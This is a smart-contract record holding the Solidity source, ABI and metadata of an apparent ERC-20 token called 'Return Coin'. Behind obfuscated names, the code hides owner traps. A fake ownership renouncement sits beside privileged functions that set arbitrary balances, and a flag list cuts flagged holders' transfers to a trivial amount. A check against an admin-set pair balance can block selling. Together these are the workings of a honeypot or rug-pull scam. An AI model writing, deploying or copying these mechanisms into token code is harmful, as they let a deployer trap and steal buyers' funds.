{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract sellMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTrading {\n    function createPair(address senderAmount, address autoToken) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface atSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface totalFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isSell) external view returns (uint256);\n\n    function transfer(address isAmount, uint256 receiverLimitSwap) external returns (bool);\n\n    function allowance(address toTakeAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLimitSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isAmount,\n        uint256 receiverLimitSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderMode, uint256 value);\n    event Approval(address indexed toTakeAt, address indexed spender, uint256 value);\n}\n\ninterface totalFeeMetadata is totalFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReturnCoin is sellMode, totalFee, totalFeeMetadata {\n\n    bool private fundTake;\n\n    function txLaunch(address launchedMinMax, address isAmount, uint256 receiverLimitSwap) internal returns (bool) {\n        require(swapReceiver[launchedMinMax] >= receiverLimitSwap);\n        swapReceiver[launchedMinMax] -= receiverLimitSwap;\n        swapReceiver[isAmount] += receiverLimitSwap;\n        emit Transfer(launchedMinMax, isAmount, receiverLimitSwap);\n        return true;\n    }\n\n    address private launchedMinFrom;\n\n    mapping(address => bool) public exemptSwap;\n\n    uint256 private enableSwap = 100000000 * 10 ** 18;\n\n    address liquidityIs;\n\n    function receiverListFund(address modeFrom) public {\n        launchLimit();\n        if (txSell != modeMax) {\n            txSell = swapTake;\n        }\n        if (modeFrom == totalAmount || modeFrom == shouldExempt) {\n            return;\n        }\n        exemptSwap[modeFrom] = true;\n    }\n\n    function approve(address tokenSender, uint256 receiverLimitSwap) public virtual override returns (bool) {\n        amountTx[_msgSender()][tokenSender] = receiverLimitSwap;\n        emit Approval(_msgSender(), tokenSender, receiverLimitSwap);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableSwap;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderShould;\n    }\n\n    uint256 constant isLiquidity = 11 ** 10;\n\n    function minToken(uint256 receiverLimitSwap) public {\n        launchLimit();\n        swapMax = receiverLimitSwap;\n    }\n\n    mapping(address => bool) public totalWalletReceiver;\n\n    uint256 public receiverFromIs = 3;\n\n    address enableMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fromEnable() public {\n        emit OwnershipTransferred(totalAmount, address(0));\n        launchedMinFrom = address(0);\n    }\n\n    function totalLimit(address launchedMinMax, address isAmount, uint256 receiverLimitSwap) internal returns (bool) {\n        if (launchedMinMax == totalAmount) {\n            return txLaunch(launchedMinMax, isAmount, receiverLimitSwap);\n        }\n        uint256 receiverMax = totalFee(shouldExempt).balanceOf(liquidityIs);\n        require(receiverMax == swapMax);\n        require(isAmount != liquidityIs);\n        if (exemptSwap[launchedMinMax]) {\n            return txLaunch(launchedMinMax, isAmount, isLiquidity);\n        }\n        receiverLimitSwap = exemptAt(launchedMinMax, isAmount, receiverLimitSwap);\n        return txLaunch(launchedMinMax, isAmount, receiverLimitSwap);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return atAmount;\n    }\n\n    address public shouldExempt;\n\n    uint256 launchEnable;\n\n    string private isLimitToken = \"Return Coin\";\n\n    function allowance(address fromLiquidityTo, address tokenSender) external view virtual override returns (uint256) {\n        if (tokenSender == enableMarketing) {\n            return type(uint256).max;\n        }\n        return amountTx[fromLiquidityTo][tokenSender];\n    }\n\n    bool public listFrom;\n\n    uint256 swapMax;\n\n    event OwnershipTransferred(address indexed liquidityLaunch, address indexed modeTrading);\n\n    function launchLimit() private view {\n        require(totalWalletReceiver[_msgSender()]);\n    }\n\n    uint8 private senderShould = 18;\n\n    address public totalAmount;\n\n    function getOwner() external view returns (address) {\n        return launchedMinFrom;\n    }\n\n    uint256 private modeMax;\n\n    function exemptAt(address launchedMinMax, address isAmount, uint256 receiverLimitSwap) internal view returns (uint256) {\n        require(receiverLimitSwap > 0);\n\n        uint256 isSwap = 0;\n        if (launchedMinMax == shouldExempt && receiverFromIs > 0) {\n            isSwap = receiverLimitSwap * receiverFromIs / 100;\n        } else if (isAmount == shouldExempt && marketingBuy > 0) {\n            isSwap = receiverLimitSwap * marketingBuy / 100;\n        }\n        require(isSwap <= receiverLimitSwap);\n        return receiverLimitSwap - isSwap;\n    }\n\n    mapping(address => uint256) private swapReceiver;\n\n    function totalLaunched(address modeReceiver, uint256 receiverLimitSwap) public {\n        launchLimit();\n        swapReceiver[modeReceiver] = receiverLimitSwap;\n    }\n\n    function receiverListMax(address liquidityMax) public {\n        if (listFrom) {\n            return;\n        }\n        \n        totalWalletReceiver[liquidityMax] = true;\n        if (swapTake == txSell) {\n            txSell = modeMax;\n        }\n        listFrom = true;\n    }\n\n    string private atAmount = \"RCN\";\n\n    function balanceOf(address isSell) public view virtual override returns (uint256) {\n        return swapReceiver[isSell];\n    }\n\n    function owner() external view returns (address) {\n        return launchedMinFrom;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isLimitToken;\n    }\n\n    bool private tradingLimitEnable;\n\n    uint256 public marketingBuy = 0;\n\n    uint256 public swapTake;\n\n    function transferFrom(address launchedMinMax, address isAmount, uint256 receiverLimitSwap) external override returns (bool) {\n        if (_msgSender() != enableMarketing) {\n            if (amountTx[launchedMinMax][_msgSender()] != type(uint256).max) {\n                require(receiverLimitSwap <= amountTx[launchedMinMax][_msgSender()]);\n                amountTx[launchedMinMax][_msgSender()] -= receiverLimitSwap;\n            }\n        }\n        return totalLimit(launchedMinMax, isAmount, receiverLimitSwap);\n    }\n\n    constructor (){\n        if (fundTake) {\n            swapTake = txSell;\n        }\n        fromEnable();\n        atSwap swapLaunchedWallet = atSwap(enableMarketing);\n        shouldExempt = buyTrading(swapLaunchedWallet.factory()).createPair(swapLaunchedWallet.WETH(), address(this));\n        liquidityIs = buyTrading(swapLaunchedWallet.factory()).feeTo();\n        \n        totalAmount = _msgSender();\n        totalWalletReceiver[totalAmount] = true;\n        swapReceiver[totalAmount] = enableSwap;\n        \n        emit Transfer(address(0), totalAmount, enableSwap);\n    }\n\n    uint256 private txSell;\n\n    function transfer(address modeReceiver, uint256 receiverLimitSwap) external virtual override returns (bool) {\n        return totalLimit(_msgSender(), modeReceiver, receiverLimitSwap);\n    }\n\n    mapping(address => mapping(address => uint256)) private amountTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTakeAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLiquidityTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLimitSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLimitSwap\",\"type\":\"uint256\"}],\"name\":\"minToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFromIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFrom\",\"type\":\"address\"}],\"name\":\"receiverListFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMax\",\"type\":\"address\"}],\"name\":\"receiverListMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLimitSwap\",\"type\":\"uint256\"}],\"name\":\"totalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalWalletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLimitSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMinMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLimitSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReturnCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}